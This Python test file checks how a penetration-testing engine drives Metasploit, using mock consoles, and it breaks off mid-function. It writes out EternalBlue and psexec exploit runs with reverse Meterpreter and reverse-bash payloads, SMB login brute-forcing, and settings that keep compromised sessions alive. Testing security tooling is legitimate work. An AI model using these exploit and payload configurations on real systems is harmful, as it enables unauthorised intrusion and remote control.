#!/usr/bin/env python3
"""
audit_msf_runner.py — Verify _run_exploit_inner's new console-based dispatch
behaves correctly without needing a live msfrpcd. Uses a mock client that
mimics pymetasploit3's surface (consoles + modules) so we can exercise:
  - missing-module path
  - missing-required-option pre-flight
  - LHOST/LPORT auto-routing
  - console output capture
  - session-opened detection
  - exploit-failed detection
  - aux module payload stripping
"""
import sys, time
sys.path.insert(0, '.')

FAIL, OK = [], []
fail = lambda m: FAIL.append(m)
ok   = lambda m: OK.append(m)


# ── Mock pymetasploit3 surface ────────────────────────────────────────────────

class MockOption:
    def __init__(self, desc='', required=False, default=None, type_='string'):
        self._d = {'desc': desc, 'required': required, 'default': default,
                   'type': type_}
    def get(self, k, default=None):
        return self._d.get(k, default)
    def __getitem__(self, k):
        return self._d[k]


class MockModule:
    """Mimics pymetasploit3 ModuleHandler enough for our runner."""
    def __init__(self, mtype, mname, required=(), targets=('Default Target',)):
        self.type     = mtype
        self.name     = mname
        self.rank     = 'excellent'
        self.required = list(required)
        self.targets  = list(targets)
        self.options  = {
            'RHOSTS': {'desc': 'Target host(s)',  'required': True},
            'RPORT':  {'desc': 'Target port',     'required': True,
                       'default': 445},
        }
        for r in required:
            if r not in self.options:
                self.options[r] = {'desc': f'required: {r}', 'required': True}
        # _runopts mimics pymetasploit3 internal state — auto-populated with
        # options that have an explicit 'default' in their schema, then mutated
        # via __setitem__ when the runner applies user options.
        self._runopts = {k: v['default']
                          for k, v in self.options.items()
                          if isinstance(v, dict) and 'default' in v
                          and v['default'] is not None}

    def __setitem__(self, key, value):
        self._runopts[key] = value

    def __getitem__(self, key):
        return self._runopts.get(key)

    @property
    def missing_required(self):
        """Same logic as real pymetasploit3 — required options not in runopts."""
        return [r for r in self.required if r not in self._runopts]


class MockConsole:
    """Plays back pre-scripted output sequences when read."""
    def __init__(self, cid, output_sequence):
        self.cid     = cid
        self._writes = []
        # Auto-prepend a fake msfrpcd banner. Real msfrpcd ALWAYS emits a banner
        # on console creation; the runner's `drain startup banner` step discards
        # the first read. Modeling this here means tests don't need to know
        # about the drain at all — they just supply the output they care about.
        self._seq    = [{'data': 'msf6 > ', 'busy': False}] + list(output_sequence)
        self._idx    = 0

    def write(self, data):
        self._writes.append(data)

    def read(self):
        if self._idx < len(self._seq):
            chunk = self._seq[self._idx]
            self._idx += 1
            return chunk
        return {'data': '', 'busy': False}

    def destroy(self):
        pass


class MockConsoles:
    def __init__(self, output_sequence):
        self._out = output_sequence
        self.created = []
    def console(self):
        c = MockConsole(cid=str(len(self.created)),
                        output_sequence=self._out)
        self.created.append(c)
        return c


class MockModules:
    def __init__(self, available):
        self._avail = available  # dict {(type, name): MockModule}
    def use(self, mtype, mname):
        return self._avail.get((mtype, mname), None) or False


class MockClient:
    def __init__(self, modules_dict, output_sequence, sessions_before=None, sessions_after=None):
        self.modules  = MockModules(modules_dict)
        self.consoles = MockConsoles(output_sequence)
        self._sb      = sessions_before or []
        self._sa      = sessions_after or []
        self._called  = 0
    def list_sessions(self):
        return []


# ── Bring in the real engine with a mocked client ─────────────────────────────

from modules.msf_engine import MsfEngine
import threading


def make_engine_with_client(client):
    eng = MsfEngine()
    eng._client    = client
    eng._connected = True
    # Patch list_sessions to use our scripted sessions
    eng._before = list(client._sb)
    eng._after  = list(client._sa)
    call_count = {'n': 0}
    def list_sessions():
        call_count['n'] += 1
        return eng._after if call_count['n'] > 1 else eng._before
    eng.list_sessions = list_sessions
    return eng


# ── Test 1: missing module → clean error ──────────────────────────────────────
client = MockClient(modules_dict={}, output_sequence=[])
eng = make_engine_with_client(client)
result = eng.run_exploit('exploit/windows/smb/nonexistent_mod',
                         options={'RHOSTS': '10.0.0.5'})
if result['status'] == 'error' and 'not found' in result['message'].lower():
    ok("Missing module returns clean error with msfconsole verify hint")
else:
    fail(f"Missing module case: {result}")


# ── Test 2: missing required option flagged BEFORE firing ─────────────────────
mod = MockModule('exploit', 'windows/smb/ms17_010_eternalblue',
                 required=['RHOSTS', 'RPORT'])
client = MockClient(
    modules_dict={('exploit', 'windows/smb/ms17_010_eternalblue'): mod},
    output_sequence=[])
eng = make_engine_with_client(client)
result = eng.run_exploit('exploit/windows/smb/ms17_010_eternalblue',
                         options={})   # RHOSTS missing
if (result['status'] == 'error'
    and 'missing_required' in result
    and 'RHOSTS' in result['missing_required']):
    ok("Missing required option caught pre-fire; surfaced via missing_required")
else:
    fail(f"Missing-required case: {result}")


# ── Test 3: LPORT auto-defaults when LHOST set ────────────────────────────────
mod = MockModule('exploit', 'windows/smb/ms17_010_eternalblue',
                 required=['RHOSTS'])
out_seq = [
    {'data': '[*] Started reverse TCP handler on 10.0.0.99:4444\n', 'busy': True},
    {'data': '[*] 10.0.0.5:445 - Connecting to target for exploitation.\n', 'busy': True},
    {'data': '[+] 10.0.0.5:445 - The target is vulnerable.\n', 'busy': True},
    {'data': '[*] Sending stage (200262 bytes) to 10.0.0.5\n', 'busy': True},
    {'data': '[*] Meterpreter session 1 opened (10.0.0.99:4444 -> 10.0.0.5:49180)\n', 'busy': False},
    {'data': '', 'busy': False},
    {'data': '', 'busy': False},
]
client = MockClient(
    modules_dict={('exploit', 'windows/smb/ms17_010_eternalblue'): mod},
    output_sequence=out_seq,
    sessions_after=[{'id': '1', 'type': 'meterpreter',
                     'tunnel_peer': '10.0.0.5:49180', 'username': 'SYSTEM'}])
eng = make_engine_with_client(client)
result = eng.run_exploit(
    'exploit/windows/smb/ms17_010_eternalblue',
    options={'RHOSTS': '10.0.0.5', 'LHOST': '10.0.0.99'})
# Check console got 'set LPORT 4444' written even though we didn't pass it
writes = ''.join(client.consoles.created[0]._writes)
if 'set LPORT 4444' in writes:
    ok("LPORT auto-defaulted to 4444 when LHOST set without LPORT")
else:
    fail(f"LPORT auto-default missing — writes: {writes[:200]}")


# ── Test 4: Session-opened detection ──────────────────────────────────────────
if result.get('session_opened') and result.get('sessions'):
    ok(f"Session detection works — {len(result['sessions'])} session(s)")
else:
    fail(f"Session not detected: opened={result.get('session_opened')}, "
         f"sessions={result.get('sessions')}")


# ── Test 5: console_output captured and returned ─────────────────────────────
if 'Meterpreter session 1 opened' in (result.get('console_output') or ''):
    ok("console_output captured (visible to operator)")
else:
    fail(f"console_output missing key line: {result.get('console_output', '')[:300]}")


# ── Test 6: Exploit-failed detection ──────────────────────────────────────────
mod = MockModule('exploit', 'windows/smb/ms17_010_eternalblue',
                 required=['RHOSTS'])
out_seq = [
    {'data': '[*] Started reverse TCP handler on 10.0.0.99:4444\n', 'busy': True},
    {'data': '[*] 10.0.0.5:445 - Connecting to target for exploitation.\n', 'busy': True},
    {'data': '[-] 10.0.0.5:445 - Exploit failed: timeout waiting for callback\n', 'busy': True},
    {'data': '[*] Exploit completed, but no session was created.\n', 'busy': False},
    {'data': '', 'busy': False},
    {'data': '', 'busy': False},
]
client = MockClient(
    modules_dict={('exploit', 'windows/smb/ms17_010_eternalblue'): mod},
    output_sequence=out_seq)
eng = make_engine_with_client(client)
result = eng.run_exploit(
    'exploit/windows/smb/ms17_010_eternalblue',
    options={'RHOSTS': '10.0.0.5', 'LHOST': '10.0.0.99'})
if result.get('exploit_failed') and not result.get('session_opened'):
    ok("Exploit-failed detected; no false session report")
else:
    fail(f"Exploit-failed case: failed={result.get('exploit_failed')}, "
         f"opened={result.get('session_opened')}")


# ── Test 7: Aux module strips payload + emits scanner note ────────────────────
mod = MockModule('auxiliary', 'scanner/smb/smb_login', required=['RHOSTS'])
out_seq = [
    {'data': '[*] 10.0.0.5:445 - Starting SMB login bruteforce\n', 'busy': True},
    {'data': '[-] 10.0.0.5:445 - Failed: Administrator:password\n', 'busy': False},
    {'data': '', 'busy': False},
    {'data': '', 'busy': False},
]
client = MockClient(
    modules_dict={('auxiliary', 'scanner/smb/smb_login'): mod},
    output_sequence=out_seq)
eng = make_engine_with_client(client)
result = eng.run_exploit('auxiliary/scanner/smb/smb_login',
                          options={'RHOSTS': '10.0.0.5', 'LHOST': '10.0.0.99'},
                          payload='windows/meterpreter/reverse_tcp')
# Payload should have been stripped, LHOST should be gone from datastore writes
writes = ''.join(client.consoles.created[0]._writes)
if ('windows/meterpreter/reverse_tcp' not in writes
    and 'auxiliary module' in (result.get('result', '').lower()
                              or '')):
    ok("Aux module path strips payload + warns operator")
else:
    fail(f"Aux strip test: writes had payload={('windows/meterpreter' in writes)}, "
         f"warned={'auxiliary' in (result.get('result','').lower())}")


# ── Test 8: Check mode reaches console with 'check' verb ─────────────────────
mod = MockModule('exploit', 'windows/smb/ms17_010_eternalblue',
                 required=['RHOSTS'])
out_seq = [
    {'data': '[+] 10.0.0.5:445 - The target is vulnerable.\n', 'busy': False},
    {'data': '', 'busy': False},
]
client = MockClient(
    modules_dict={('exploit', 'windows/smb/ms17_010_eternalblue'): mod},
    output_sequence=out_seq)
eng = make_engine_with_client(client)
result = eng.run_exploit('exploit/windows/smb/ms17_010_eternalblue',
                          options={'RHOSTS': '10.0.0.5'},
                          action='check')
writes = ''.join(client.consoles.created[0]._writes)
if 'check\n' in writes and result.get('check_vulnerable'):
    ok("Check mode sends 'check' verb + parses vulnerable verdict")
else:
    fail(f"Check mode: check_sent={'check' in writes}, "
         f"vuln={result.get('check_vulnerable')}")


# ── Regression: smb_login's 39 required-with-default options ─────────────────
# This is the exact false-positive bug Ben hit in production. Every option in
# the DCERPC::, NTLM::, SMB:: namespaces is required:true with a default value.
# Pre-flight must respect those defaults — only flag truly missing options.
SMB_LOGIN_OPTS = {
    'RHOSTS':  {'desc': 'Target hosts',     'required': True},  # no default
    'RPORT':   {'desc': 'Target port',      'required': True, 'default': 445},
    'VERBOSE': {'desc': 'Enable detailed output', 'required': True, 'default': False},
    'THREADS': {'desc': 'Number of threads', 'required': True, 'default': 1},
    'ConnectTimeout':       {'required': True, 'default': 10},
    'SSLVersion':           {'required': True, 'default': 'Auto'},
    'DCERPC::max_frag_size':{'required': True, 'default': 4096},
    'DCERPC::ReadTimeout':  {'required': True, 'default': 10},
    'NTLM::UseNTLMv2':      {'required': True, 'default': True},
    'NTLM::UseNTLM2_session': {'required': True, 'default': True},
    'NTLM::SendLM':         {'required': True, 'default': True},
    'NTLM::UseLMKey':       {'required': True, 'default': False},
    'NTLM::SendNTLM':       {'required': True, 'default': True},
    'NTLM::SendSPN':        {'required': True, 'default': True},
    'SMB::pipe_evasion':    {'required': True, 'default': False},
    'SMB::pipe_write_min_size': {'required': True, 'default': 1},
    'SMB::pipe_write_max_size': {'required': True, 'default': 1024},
    'SMB::pipe_read_min_size':  {'required': True, 'default': 1},
    'SMB::pipe_read_max_size':  {'required': True, 'default': 1024},
    'SMB::pad_data_level':      {'required': True, 'default': 0},
    'SMB::pad_file_level':      {'required': True, 'default': 0},
    'SMB::obscure_trans_pipe_level': {'required': True, 'default': 0},
    'SMBName':                  {'required': True, 'default': '*SMBSERVER'},
    'SMB::VerifySignature':     {'required': True, 'default': False},
    'SMB::ChunkSize':           {'required': True, 'default': 500},
    'SMB::Native_OS':           {'required': True, 'default': 'Windows 2000 2195'},
    'SMB::Native_LM':           {'required': True, 'default': 'Windows 2000 5.0'},
    'SMB::ProtocolVersion':     {'required': True, 'default': '1,2,3'},
    'SMB::AlwaysEncrypt':       {'required': True, 'default': True},
    'SMB::Auth':                {'required': True, 'default': 'auto'},
    'KrbClockSkew':             {'required': True, 'default': 300},
    'SMB::KrbOfferedEncryptionTypes': {'required': True, 'default': '23,17,18'},
    'ShowProgress':             {'required': True, 'default': True},
    'ShowProgressPercent':      {'required': True, 'default': 10},
    'BRUTEFORCE_SPEED':         {'required': True, 'default': 5},
    'STOP_ON_SUCCESS':          {'required': True, 'default': False},
    'ANONYMOUS_LOGIN':          {'required': True, 'default': True},
    'REMOVE_USER_FILE':         {'required': True, 'default': True},
    'REMOVE_PASS_FILE':         {'required': True, 'default': True},
    'REMOVE_USERPASS_FILE':     {'required': True, 'default': True},
    'PASSWORD_SPRAY':           {'required': True, 'default': False},
    'ABORT_ON_LOCKOUT':         {'required': True, 'default': False},
}
mod = MockModule('auxiliary', 'scanner/smb/smb_login',
                  required=list(SMB_LOGIN_OPTS.keys()))
mod.options = SMB_LOGIN_OPTS
# Re-populate _runopts from the new options dict so missing_required works.
# Mimics pymetasploit3: every option with an explicit default goes into runopts.
mod._runopts = {k: v['default']
                 for k, v in SMB_LOGIN_OPTS.items()
                 if isinstance(v, dict) and 'default' in v
                 and v['default'] is not None}

out_seq = [
    '[*] 192.168.1.95:445  - Starting SMB login bruteforce\n',
    '[-] 192.168.1.95:445  - Bruteforce did not yield credentials\n',
    'msf6 > ',
]
client = MockClient(
    modules_dict={('auxiliary', 'scanner/smb/smb_login'): mod},
    output_sequence=out_seq)
eng = make_engine_with_client(client)
# User supplies ONLY RHOSTS. Every other "required" option has a default.
# Pre-flight should accept this and proceed to fire the module.
result = eng.run_exploit('auxiliary/scanner/smb/smb_login',
                          options={'RHOSTS': '192.168.1.95'},
                          action='run')

if result.get('status') == 'error' and 'Missing required' in result.get('message', ''):
    fail(f"REGRESSION: pre-flight still false-flags required-with-default options. "
         f"Flagged: {result.get('missing_required', [])[:5]}...")
elif result.get('missing_required'):
    fail(f"missing_required field populated incorrectly: "
         f"{result['missing_required']}")
else:
    ok("smb_login regression: pre-flight respects defaults — only RHOSTS provided, "
       "39 required-with-default options correctly NOT flagged as missing")

# Negative case: if user omits RHOSTS too, that should still error.
# Reset mock state — the previous call set RHOSTS in _runopts and the mock
# is shared, so we have to clear it back to defaults-only before re-checking.
mod._runopts = {k: v['default']
                 for k, v in SMB_LOGIN_OPTS.items()
                 if isinstance(v, dict) and 'default' in v
                 and v['default'] is not None}
result = eng.run_exploit('auxiliary/scanner/smb/smb_login',
                          options={},     # nothing supplied
                          action='run')
if (result.get('status') == 'error'
    and 'RHOSTS' in result.get('missing_required', [])
    and len(result.get('missing_required', [])) == 1):
    ok("smb_login pre-flight correctly catches genuinely missing RHOSTS "
       "(only RHOSTS flagged, not the 39 with defaults)")
else:
    fail(f"Pre-flight didn't catch missing RHOSTS or over-flagged: "
         f"missing={result.get('missing_required')}")


# ── Bool-subscription / pymetasploit3 metadata-load fallback ────────────────
# When pymetasploit3 can't parse an exploit module's metadata (because the
# library trips on module.compatible_payloads returning a malformed response),
# the runner should NOT bail. It should log the limitation, skip pre-flight,
# and proceed to console execution. The bug pattern: aux works, exploit/* dies.
# This test verifies the fallback: metadata load fails → runner continues.
class BadStateMockModules:
    def use(self, mtype, mname):
        raise TypeError("'bool' object is not subscriptable")

bad_out_seq = [
    'msf6 > use exploit/windows/smb/ms17_010_eternalblue\n',
    'msf6 exploit(eternalblue) > set RHOSTS 192.168.1.95\n',
    'msf6 exploit(eternalblue) > run\n',
    '[*] Started reverse TCP handler\n',
    '[-] Exploit aborted due to failure: no-target-supported\n',
    'msf6 > ',
]

class BadStateClient:
    def __init__(self):
        self.modules  = BadStateMockModules()
        self.consoles = MockConsoles(bad_out_seq)
        self.sessions = type('S', (), {'list': {}})()
        self._sb      = []
        self._sa      = []
        self._called  = 0
    def list_sessions(self):
        return []

eng = make_engine_with_client(BadStateClient())
result = eng.run_exploit('exploit/windows/smb/ms17_010_eternalblue',
                          options={'RHOSTS': '192.168.1.95'},
                          action='run')
result_text = result.get('result', '') or ''

# New expected behavior: runner DOES NOT return a hard error from pre-flight.
# It logs the pymetasploit3 limitation and proceeds. Status may end up 'ok'
# (console ran) or 'error' (console saw exploit failure) — either is fine.
# The KEY assertion is: we got past the pre-flight and the log explains why.
proceeded = (
    'pymetasploit3 cannot parse' in result_text
    and 'skipping pre-flight' in result_text
    and 'Module will still fire via console' in result_text
)
if proceeded:
    ok("pymetasploit3 metadata failure: runner degrades gracefully — "
       "logs the limitation, skips pre-flight, proceeds to console execution")
else:
    fail(f"Graceful degradation failed: proceeded_marker={proceeded}, "
         f"status={result.get('status')}, msg={result.get('message')}")


# ── Regression: ms17_010_psexec CheckModule false-positive ───────────────────
# CheckModule is required:true but ships a default (auxiliary/scanner/smb/
# smb_ms17_010). pymetasploit3's runopts didn't surface that default, so the
# old pre-flight blocked psexec entirely. The curated pre-flight only blocks
# on RHOSTS/RHOST/LHOST — so CheckModule (and every other defaulted option)
# flows through to MSF, which fills the default at run time.
mod = MockModule('exploit', 'windows/smb/ms17_010_psexec',
                  required=['RHOSTS', 'RPORT', 'CheckModule', 'SMBUser',
                            'SMBPass', 'SMBDomain'])
# CheckModule has a default; SMBUser/SMBPass/SMBDomain are blank-default creds.
mod.options = {
    'RHOSTS':      {'desc': 'Target', 'required': True},
    'RPORT':       {'desc': 'Port', 'required': True, 'default': 445},
    'CheckModule': {'desc': 'Check module', 'required': True,
                    'default': 'auxiliary/scanner/smb/smb_ms17_010'},
    'SMBUser':     {'desc': 'SMB user', 'required': True, 'default': ''},
    'SMBPass':     {'desc': 'SMB pass', 'required': True, 'default': ''},
    'SMBDomain':   {'desc': 'SMB domain', 'required': True, 'default': '.'},
}
out_seq = [
    '[*] 192.168.1.43:445 - Authenticating to 192.168.1.43 as user \'\'...\n',
    '[*] 192.168.1.43:445 - Selecting PowerShell target\n',
    '[+] 192.168.1.43:445 - Meterpreter session 1 opened\n',
    'msf6 > ',
]
client = MockClient(
    modules_dict={('exploit', 'windows/smb/ms17_010_psexec'): mod},
    output_sequence=out_seq,
    sessions_after=[{'id': '1', 'type': 'meterpreter', 'target': '192.168.1.43'}])
eng = make_engine_with_client(client)
# Operator supplies RHOSTS + LHOST + reverse payload. CheckModule omitted —
# it has a default, so pre-flight must NOT block on it.
result = eng.run_exploit('exploit/windows/smb/ms17_010_psexec',
                          options={'RHOSTS': '192.168.1.43', 'LHOST': '192.168.1.254'},
                          payload='windows/meterpreter/reverse_tcp',
                          action='run')

if result.get('status') == 'error' and 'CheckModule' in result.get('message', ''):
    fail(f"REGRESSION: pre-flight still blocks on CheckModule (has a default): "
         f"{result.get('message')}")
elif result.get('missing_required') and 'CheckModule' in result['missing_required']:
    fail(f"CheckModule false-flagged: {result['missing_required']}")
else:
    ok("ms17_010_psexec regression: CheckModule (defaulted) NOT blocked — "
       "curated pre-flight only gates RHOSTS/LHOST, lets MSF fill the rest")

# Negative: reverse payload without LHOST should still be caught
result = eng.run_exploit('exploit/windows/smb/ms17_010_psexec',
                          options={'RHOSTS': '192.168.1.43'},   # no LHOST
                          payload='windows/meterpreter/reverse_tcp',
                          action='run')
if (result.get('status') == 'error'
    and 'LHOST' in result.get('missing_required', [])):
    ok("Reverse payload without LHOST correctly caught by curated pre-flight")
else:
    fail(f"LHOST omission not caught for reverse payload: "
         f"missing={result.get('missing_required')}")


# ── RPORT auto-correction for ms17_010_* ─────────────────────────────────────
# EternalBlue/psexec MUST hit SMB on 445. If the UI pre-fills 139 (NetBIOS),
# the runner should silently correct it and tell the operator — a wrong port
# is the #1 cause of "exploit completed but no session" for these modules.
mod = MockModule('exploit', 'windows/smb/ms17_010_eternalblue',
                  required=['RHOSTS', 'RPORT'])
out_seq = ['[+] 192.168.1.43:445 - session 1 opened\n', 'msf6 > ']
client = MockClient(
    modules_dict={('exploit', 'windows/smb/ms17_010_eternalblue'): mod},
    output_sequence=out_seq,
    sessions_after=[{'id': '1', 'type': 'meterpreter', 'target': '192.168.1.43'}])
eng = make_engine_with_client(client)
result = eng.run_exploit('exploit/windows/smb/ms17_010_eternalblue',
                          options={'RHOSTS': '192.168.1.43', 'RPORT': '139',
                                   'LHOST': '192.168.1.254'},
                          payload='windows/x64/meterpreter/reverse_tcp',
                          action='run')
result_text = result.get('result', '') or ''
if 'auto-corrected 139' in result_text and '445' in result_text:
    ok("ms17_010 RPORT auto-corrected 139→445 (wrong port can't silently "
       "sink the exploit)")
else:
    fail(f"RPORT auto-correction didn't fire: result snippet="
         f"{result_text[:200]}")


# ── Success detection: console says 'session opened' but list lags ───────────
# The false-negative Ben flagged: exploit succeeds, console prints
# "Meterpreter session 1 opened", but list_sessions() hasn't synced yet so the
# diff is empty. The runner must (a) set session_opened=True from the text, and
# (b) retry list_sessions once to try to populate details. Either way, the
# response must signal success — never a bare failure.
class LaggyMockModules:
    def use(self, mtype, mname):
        m = MockModule('exploit', 'windows/smb/ms17_010_eternalblue',
                        required=['RHOSTS'])
        return m

class LaggySessions:
    """sessions.list stays empty even after the exploit 'opens' one —
    simulates msfrpcd never syncing within the runner's retry window."""
    list = {}

class LaggyClient:
    def __init__(self):
        self.modules  = LaggyMockModules()
        self.consoles = MockConsoles([
            {'data': '[*] Started reverse TCP handler on 192.168.1.254:4444\n', 'busy': True},
            {'data': '[*] 192.168.1.43:445 - Sending SMB exploit\n', 'busy': True},
            {'data': '[+] 192.168.1.43:445 - Meterpreter session 1 opened '
                     '(192.168.1.254:4444 -> 192.168.1.43:49190)\n', 'busy': False},
            {'data': '', 'busy': False},
            {'data': '', 'busy': False},
        ])
        self.sessions = LaggySessions()
        self._sb = []
        self._sa = []          # list NEVER reflects the session — worst case
        self._called = 0
    def list_sessions(self):
        return []

eng = make_engine_with_client(LaggyClient())
result = eng.run_exploit('exploit/windows/smb/ms17_010_eternalblue',
                          options={'RHOSTS': '192.168.1.43', 'LHOST': '192.168.1.254'},
                          payload='windows/x64/meterpreter/reverse_tcp',
                          action='run')

# Even though list_sessions() never returned the session, the console text
# said it opened — so session_opened MUST be True and exploit_failed False.
if result.get('session_opened') is True and not result.get('exploit_failed'):
    ok("Session-opened-but-list-lagged: session_opened=True from console text, "
       "NOT reported as failure (closes the false-negative)")
else:
    fail(f"FALSE-NEGATIVE: console said session opened but response says "
         f"session_opened={result.get('session_opened')}, "
         f"exploit_failed={result.get('exploit_failed')}")

# Negative-phrasing guard: 'no session was created' must NOT trip session_opened
class FailModules:
    def use(self, mtype, mname):
        return MockModule('exploit', 'windows/smb/ms17_010_eternalblue',
                           required=['RHOSTS'])
class FailClient:
    def __init__(self):
        self.modules  = FailModules()
        self.consoles = MockConsoles([
            {'data': '[*] 192.168.1.43:445 - Sending exploit\n', 'busy': True},
            {'data': '[*] Exploit completed, but no session was created.\n', 'busy': False},
            {'data': '', 'busy': False},
        ])
        self.sessions = type('S', (), {'list': {}})()
        self._sb = []; self._sa = []; self._called = 0
    def list_sessions(self):
        return []

eng = make_engine_with_client(FailClient())
result = eng.run_exploit('exploit/windows/smb/ms17_010_eternalblue',
                          options={'RHOSTS': '192.168.1.43', 'LHOST': '192.168.1.254'},
                          payload='windows/x64/meterpreter/reverse_tcp',
                          action='run')
if result.get('session_opened') is False and result.get('exploit_failed') is True:
    ok("Negative phrasing ('no session was created') correctly NOT a false "
       "success — session_opened=False, exploit_failed=True")
else:
    fail(f"Negative phrasing mis-detected: session_opened="
         f"{result.get('session_opened')}, exploit_failed={result.get('exploit_failed')}")


# ── Frontend success-decision guard (static check of exploit.html) ──────────
from pathlib import Path as _P
exploit_html = _P('templates/exploit.html').read_text()
# The run-mode branch MUST consult d.session_opened, not only d.sessions
if 'd.session_opened' in exploit_html:
    ok("Frontend run-mode decision consults d.session_opened (not only "
       "d.sessions) — console-confirmed sessions render as success")
else:
    fail("Frontend ignores d.session_opened — false-negative gap still open")
# The dead tunnel_peer reference should be gone
if 's.tunnel_peer' not in exploit_html:
    ok("Dead s.tunnel_peer reference removed (UI uses real list_sessions keys)")
else:
    fail("Frontend still references s.tunnel_peer (key list_sessions never returns)")


# ── Session-survival hardening: PrependMigrate (stager-level migration) ───────
from modules.msf_engine import (
    _ADAPTIVE_STAGELESS_PAYLOADS,
    _curated_default_payload,
    _is_fragile_exploit,
    _is_stageless_payload,
    _PREPEND_MIGRATE_PROC,
)

if (_is_fragile_exploit('exploit/windows/smb/ms17_010_eternalblue')
        and _is_fragile_exploit('exploit/windows/rdp/cve_2019_0708_bluekeep_rce')
        and not _is_fragile_exploit('exploit/multi/http/tomcat_mgr_upload')):
    ok("_is_fragile_exploit flags eternalblue/bluekeep, not web exploits")
else:
    fail("_is_fragile_exploit classification wrong")

if (_curated_default_payload('exploit/windows/smb/ms17_010_eternalblue')
        == 'windows/x64/meterpreter/reverse_tcp'):
    ok("MS17-010 has curated staged x64 reverse payload default (validated)")
else:
    fail("MS17-010 curated payload default missing/wrong")

if (_ADAPTIVE_STAGELESS_PAYLOADS.get('exploit/windows/smb/ms17_010_eternalblue')
        == 'windows/x64/meterpreter/reverse_tcp'):
    ok("MS17-010 has adaptive fallback payload (staged, validated)")
else:
    fail("MS17-010 adaptive fallback missing/wrong")

def _capture_run(module, auto_migrate=None, action='run',
                 payload='windows/x64/meterpreter/reverse_tcp',
                 options=None):
    short = module.split('/', 1)[1]
    mod = MockModule('exploit', short, required=['RHOSTS'])
    written = []
    class CapConsole(MockConsole):
        def write(self, data):
            written.append(data); super().write(data)
    class CapConsoles(MockConsoles):
        def console(self):
            c = CapConsole(cid=str(len(self.created)), output_sequence=self._out)
            self.created.append(c); return c
    client = MockClient(modules_dict={('exploit', short): mod},
        output_sequence=[{'data': '[+] session 1 opened', 'busy': False},
                         {'data': '', 'busy': False}],
        sessions_after=[{'id': '1', 'type': 'meterpreter', 'target': 'x'}])
    client.consoles = CapConsoles([{'data': '[+] session 1 opened', 'busy': False},
                                   {'data': '', 'busy': False}])
    eng = make_engine_with_client(client)
    opts = options or {'RHOSTS': '192.168.1.43', 'LHOST': '192.168.1.254'}
    eng.run_exploit(module,
                    options=opts,
                    payload=payload, action=action, auto_migrate=auto_migrate)
    return written

# Fragile + stageless windows payload (MS17-010 default), auto → spawn-migrate
w = _capture_run('exploit/windows/smb/ms17_010_eternalblue', auto_migrate=None,
                 payload='windows/x64/meterpreter_reverse_tcp')
if any('InitialAutoRunScript post/windows/manage/migrate' in x for x in w):
    ok("Fragile stageless exploit auto-injects spawn-and-migrate post module")
else:
    fail(f"Fragile stageless did NOT inject spawn-migrate: "
         f"{[x for x in w if 'set' in x]}")
if any(('run -z' in x or 'exploit -z' in x) and '-j' not in x for x in w):
    ok("Exploit launched foreground non-interacting (-z, not -j)")
else:
    fail(f"Exploit not launched with foreground -z: {[x for x in w if x.strip()][-3:]}")

# Fragile + staged windows payload → PrependMigrate injected
w = _capture_run('exploit/windows/smb/ms17_010_eternalblue', auto_migrate=None,
                 payload='windows/x64/meterpreter/reverse_tcp')
if (any('set PrependMigrate true' in x for x in w)
        and any(f'set PrependMigrateProc {_PREPEND_MIGRATE_PROC}' in x for x in w)):
    ok("Fragile staged exploit still injects PrependMigrate")
else:
    fail(f"Fragile staged did NOT inject PrependMigrate: {[x for x in w if 'set' in x]}")

# Non-fragile, auto → no PrependMigrate
w = _capture_run('exploit/multi/http/tomcat_mgr_upload', auto_migrate=None,
                 payload='java/meterpreter/reverse_tcp')
if not any('PrependMigrate' in x for x in w):
    ok("Non-fragile exploit does NOT inject PrependMigrate in auto mode")
else:
    fail("Non-fragile exploit wrongly injected PrependMigrate")

# Fragile but NON-windows payload → no PrependMigrate (it's windows-payload-only)
w = _capture_run('exploit/windows/smb/ms17_010_eternalblue', auto_migrate=True,
                 payload='cmd/unix/reverse_bash')
if not any('PrependMigrate' in x for x in w):
    ok("PrependMigrate skipped for non-windows payload (it's windows-payload-only)")
else:
    fail("PrependMigrate wrongly injected for a non-windows payload")

# auto_migrate=False on fragile → suppressed
w = _capture_run('exploit/windows/smb/ms17_010_eternalblue', auto_migrate=False)
if not any('PrependMigrate' in x for x in w):
    ok("auto_migrate=False suppresses PrependMigrate on a fragile exploit (operator control)")
else:
    fail("auto_migrate=False did not suppress PrependMigrate")

# auto_migrate=True on non-fragile windows exploit → forced on
w = _capture_run('exploit/windows/iis/iis_webdav_upload_asp', auto_migrate=True)
if any('set PrependMigrate true' in x for x in w):
    ok("auto_migrate=True forces PrependMigrate on a non-fragile windows exploit")
else:
    fail("auto_migrate=True did not force PrependMigrate")

# check mode → no PrependMigrate
w = _capture_run('exploit/windows/smb/ms17_010_eternalblue', auto_migrate=True,
                 action='check')
if not any('PrependMigrate' in x for x in w):
    ok("check mode never injects PrependMigrate (no session involved)")
else:
    fail("check mode wrongly injected PrependMigrate")

# Blank payload on MS17-010 → stageless + InitialAutoRunScript migrate
w = _capture_run('exploit/windows/smb/ms17_010_eternalblue',
                 auto_migrate=None, payload=None)
if (any('set PAYLOAD windows/x64/meterpreter/reverse_tcp' in x for x in w)
        and any('set PrependMigrate true' in x for x in w)
        and any('set EXITFUNC thread' in x for x in w)):
    ok("Blank MS17-010 auto-selects staged Meterpreter + PrependMigrate + EXITFUNC")
else:
    fail(f"Blank MS17-010 payload did not get staged hardening writes: {w}")

# The same auto-selection makes missing LHOST a pre-fire error instead of a
# doomed exploit run with an implicit reverse payload and nowhere to call back.
short = 'windows/smb/ms17_010_eternalblue'
mod = MockModule('exploit', short, required=['RHOSTS'])
client = MockClient(
    modules_dict={('exploit', short): mod},
    output_sequence=[])
eng = make_engine_with_client(client)
result = eng.run_exploit(
    'exploit/windows/smb/ms17_010_eternalblue',
    options={'RHOSTS': '192.168.1.43'},
    payload=None,
    action='run')
if (result.get('status') == 'error'
        and 'LHOST' in result.get('missing_required', [])):
    ok("Blank MS17-010 payload requires LHOST before firing reverse payload")
else:
    fail(f"Blank MS17-010 missing-LHOST not caught: {result}")

# Adaptive behavior: if a newly-opened session dies, the next blank-payload run
# for the same module+target should auto-switch to stageless Meterpreter.
def _capture_blank_run(module, rhost, lhost, session_id):
    short = module.split('/', 1)[1]
    mod = MockModule('exploit', short, required=['RHOSTS'])
    written = []
    class CapConsole(MockConsole):
        def write(self, data):
            written.append(data); super().write(data)
    class CapConsoles(MockConsoles):
        def console(self):
            c = CapConsole(cid=str(len(self.created)), output_sequence=self._out)
            self.created.append(c); return c
    out = [{'data': '[*] Sending stage\n[+] Meterpreter session opened\n', 'busy': False},
           {'data': '', 'busy': False}]
    client = MockClient(
